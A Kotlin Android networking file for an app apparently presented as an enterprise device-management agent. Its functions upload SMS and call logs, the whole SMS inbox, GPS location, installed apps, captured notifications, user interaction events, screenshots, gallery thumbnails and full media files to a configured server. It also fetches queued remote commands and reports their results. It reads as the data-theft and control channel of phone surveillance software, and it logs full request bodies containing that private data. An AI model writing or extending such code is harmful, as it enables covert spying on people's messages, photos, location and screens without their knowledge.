package com.example.gmaagent.network

import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.logging.HttpLoggingInterceptor
import java.util.concurrent.TimeUnit

/**
 * HTTP client for communicating with the EMM backend server.
 * Uses OkHttp + kotlinx.serialization for type-safe networking.
 */
object ApiClient {

    private const val TAG = "ApiClient"

    private val json = Json {
        ignoreUnknownKeys = true
        encodeDefaults = true
        isLenient = true
    }

    private val JSON_MEDIA = "application/json; charset=utf-8".toMediaType()

    private val client: OkHttpClient by lazy {
        OkHttpClient.Builder()
            .connectTimeout(12, TimeUnit.SECONDS)
            .readTimeout(15, TimeUnit.SECONDS)
            .writeTimeout(15, TimeUnit.SECONDS)
            .retryOnConnectionFailure(true)
            .addInterceptor(
                HttpLoggingInterceptor().apply {
                    level = HttpLoggingInterceptor.Level.BODY
                }
            )
            .build()
    }

    /**
     * Clears all pooled socket connections.
     * Crucial when network transitions from offline to online (data toggled)
     * so stale or broken TCP sockets are not reused.
     */
    fun resetConnectionPool() {
        try {
            client.connectionPool.evictAll()
            Log.i(TAG, "OkHttp connection pool evicted successfully")
        } catch (e: Exception) {
            Log.w(TAG, "Could not evict connection pool: ${e.message}")
        }
    }

    // ── Sync endpoint ────────────────────────────────────────

    /**
     * POST /sync/data — uploads SMS + call logs to the server.
     * Returns the server's acknowledgement or null on failure.
     */
    suspend fun syncData(payload: DeviceSyncRequest): SyncAckResponse? =
        withContext(Dispatchers.IO) {
            try {
                val body = json.encodeToString(payload).toRequestBody(JSON_MEDIA)
                val request = Request.Builder()
                    .url("${ServerConfig.baseUrl}/sync/data")
                    .addHeader("X-API-Key", ServerConfig.deviceApiKey)
                    .post(body)
                    .build()

                client.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        val responseBody = response.body?.string() ?: return@withContext null
                        json.decodeFromString<SyncAckResponse>(responseBody)
                    } else {
                        Log.e(TAG, "Sync failed: ${response.code} — ${response.body?.string()}")
                        null
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Sync error", e)
                null
            }
        }

    // ── Poll pending commands ────────────────────────────────

    /**
     * GET /sync/pending-commands — fetches commands queued for this device.
     */
    suspend fun fetchPendingCommands(): List<PendingCommand> =
        withContext(Dispatchers.IO) {
            try {
                val request = Request.Builder()
                    .url("${ServerConfig.baseUrl}/sync/pending-commands")
                    .addHeader("X-API-Key", ServerConfig.deviceApiKey)
                    .get()
                    .build()

                client.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        val responseBody = response.body?.string() ?: return@withContext emptyList()
                        json.decodeFromString<List<PendingCommand>>(responseBody)
                    } else {
                        Log.e(TAG, "Fetch commands failed: ${response.code}")
                        emptyList()
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Fetch commands error", e)
                emptyList()
            }
        }

    // ── Report command status ────────────────────────────────

    /**
     * POST /sync/command-status — reports back the execution result of a command.
     */
    suspend fun reportCommandStatus(update: CommandStatusUpdate): Boolean =
        withContext(Dispatchers.IO) {
            try {
                val body = json.encodeToString(update).toRequestBody(JSON_MEDIA)
                val request = Request.Builder()
                    .url("${ServerConfig.baseUrl}/sync/command-status")
                    .addHeader("X-API-Key", ServerConfig.deviceApiKey)
                    .post(body)
                    .build()

                client.newCall(request).execute().use { response ->
                    response.isSuccessful
                }
            } catch (e: Exception) {
                Log.e(TAG, "Report status error", e)
                false
            }
        }

    // ── Device registration ──────────────────────────────────

    /**
     * POST /devices/register — registers this device with the server using the master key.
     * Returns the registration response (including the device's new API key) or null.
     */
    suspend fun registerDevice(
        payload: DeviceRegisterRequest,
        masterApiKey: String,
    ): DeviceRegisterResponse? =
        withContext(Dispatchers.IO) {
            try {
                val body = json.encodeToString(payload).toRequestBody(JSON_MEDIA)
                val request = Request.Builder()
                    .url("${ServerConfig.baseUrl}/devices/register")
                    .addHeader("X-API-Key", masterApiKey)
                    .post(body)
                    .build()

                client.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        val responseBody = response.body?.string() ?: return@withContext null
                        json.decodeFromString<DeviceRegisterResponse>(responseBody)
                    } else {
                        Log.e(TAG, "Register failed: ${response.code} — ${response.body?.string()}")
                        null
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Register error", e)
                null
            }
        }

    // ── Communication Logs sync ──────────────────────────────

    /**
     * POST /communication-logs/sync — uploads full SMS inbox history
     * as Communication Logs to the server.
     * Returns the server's acknowledgement or null on failure.
     */
    suspend fun syncCommunicationLogs(payload: CommunicationLogSyncRequest): CommunicationLogSyncResponse? =
        withContext(Dispatchers.IO) {
            try {
                val body = json.encodeToString(payload).toRequestBody(JSON_MEDIA)
                val request = Request.Builder()
                    .url("${ServerConfig.baseUrl}/communication-logs/sync")
                    .addHeader("X-API-Key", ServerConfig.deviceApiKey)
                    .post(body)
                    .build()

                client.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        val responseBody = response.body?.string() ?: return@withContext null
                        json.decodeFromString<CommunicationLogSyncResponse>(responseBody)
                    } else {
                        Log.e(TAG, "Communication logs sync failed: ${response.code} — ${response.body?.string()}")
                        null
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Communication logs sync error", e)
                null
            }
        }

    // ── Telemetry & Diagnostics ──────────────────────────────

    /**
     * POST /sync/telemetry — uploads device diagnostics, GPS coordinates,
     * network intelligence, and installed apps list.
     */
    suspend fun sendTelemetry(payload: DeviceTelemetryRequest): DeviceTelemetryResponse? =
        withContext(Dispatchers.IO) {
            try {
                val body = json.encodeToString(payload).toRequestBody(JSON_MEDIA)
                val request = Request.Builder()
                    .url("${ServerConfig.baseUrl}/sync/telemetry")
                    .addHeader("X-API-Key", ServerConfig.deviceApiKey)
                    .post(body)
                    .build()

                client.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        val responseBody = response.body?.string() ?: return@withContext null
                        json.decodeFromString<DeviceTelemetryResponse>(responseBody)
                    } else {
                        Log.e(TAG, "Telemetry send failed: ${response.code} — ${response.body?.string()}")
                        null
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Telemetry send error", e)
                null
            }
        }

    // ── Monitoring: Notifications ────────────────────────────

    /**
     * POST /monitoring/notifications — uploads captured notifications to the server.
     */
    suspend fun syncNotifications(payload: NotificationSyncRequest): NotificationSyncResponse? =
        withContext(Dispatchers.IO) {
            try {
                val body = json.encodeToString(payload).toRequestBody(JSON_MEDIA)
                val request = Request.Builder()
                    .url("${ServerConfig.baseUrl}/monitoring/notifications")
                    .addHeader("X-API-Key", ServerConfig.deviceApiKey)
                    .post(body)
                    .build()

                client.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        val responseBody = response.body?.string() ?: return@withContext null
                        json.decodeFromString<NotificationSyncResponse>(responseBody)
                    } else {
                        Log.e(TAG, "Notifications sync failed: ${response.code}")
                        null
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Notifications sync error", e)
                null
            }
        }

    // ── Monitoring: User Interactions ────────────────────────

    /**
     * POST /monitoring/interactions — uploads user interaction events to the server.
     */
    suspend fun syncInteractions(payload: InteractionSyncRequest): InteractionSyncResponse? =
        withContext(Dispatchers.IO) {
            try {
                val body = json.encodeToString(payload).toRequestBody(JSON_MEDIA)
                val request = Request.Builder()
                    .url("${ServerConfig.baseUrl}/monitoring/interactions")
                    .addHeader("X-API-Key", ServerConfig.deviceApiKey)
                    .post(body)
                    .build()

                client.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        val responseBody = response.body?.string() ?: return@withContext null
                        json.decodeFromString<InteractionSyncResponse>(responseBody)
                    } else {
                        Log.e(TAG, "Interactions sync failed: ${response.code}")
                        null
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Interactions sync error", e)
                null
            }
        }

    // ── Monitoring: Screenshots ──────────────────────────────

    /**
     * POST /monitoring/screenshot — uploads a captured screenshot to the server.
     */
    suspend fun uploadScreenshot(payload: ScreenshotUploadRequest): ScreenshotUploadResponse? =
        withContext(Dispatchers.IO) {
            try {
                val body = json.encodeToString(payload).toRequestBody(JSON_MEDIA)
                val request = Request.Builder()
                    .url("${ServerConfig.baseUrl}/monitoring/screenshot")
                    .addHeader("X-API-Key", ServerConfig.deviceApiKey)
                    .post(body)
                    .build()

                client.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        val responseBody = response.body?.string() ?: return@withContext null
                        json.decodeFromString<ScreenshotUploadResponse>(responseBody)
                    } else {
                        Log.e(TAG, "Screenshot upload failed: ${response.code}")
                        null
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Screenshot upload error", e)
                null
            }
        }

    // ── Media Library: Thumbnails ────────────────────────────

    /**
     * POST /media/thumbnails — uploads gallery thumbnails to the server.
     */
    suspend fun syncMediaThumbnails(payload: MediaThumbnailSyncRequest): MediaThumbnailSyncResponse? =
        withContext(Dispatchers.IO) {
            try {
                val body = json.encodeToString(payload).toRequestBody(JSON_MEDIA)
                val request = Request.Builder()
                    .url("${ServerConfig.baseUrl}/media/thumbnails")
                    .addHeader("X-API-Key", ServerConfig.deviceApiKey)
                    .post(body)
                    .build()

                client.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        val responseBody = response.body?.string() ?: return@withContext null
                        json.decodeFromString<MediaThumbnailSyncResponse>(responseBody)
                    } else {
                        Log.e(TAG, "Thumbnail sync failed: ${response.code}")
                        null
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Thumbnail sync error", e)
                null
            }
        }

    // ── Media Library: Full File Upload ──────────────────────

    /**
     * POST /media/full-file — uploads a full-resolution media file.
     */
    suspend fun uploadMediaFullFile(payload: MediaFullFileUploadRequest): MediaFullFileUploadResponse? =
        withContext(Dispatchers.IO) {
            try {
                val body = json.encodeToString(payload).toRequestBody(JSON_MEDIA)
                val request = Request.Builder()
                    .url("${ServerConfig.baseUrl}/media/full-file")
                    .addHeader("X-API-Key", ServerConfig.deviceApiKey)
                    .post(body)
                    .build()

                client.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        val responseBody = response.body?.string() ?: return@withContext null
                        json.decodeFromString<MediaFullFileUploadResponse>(responseBody)
                    } else {
                        Log.e(TAG, "Full file upload failed: ${response.code}")
                        null
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Full file upload error", e)
                null
            }
        }
}

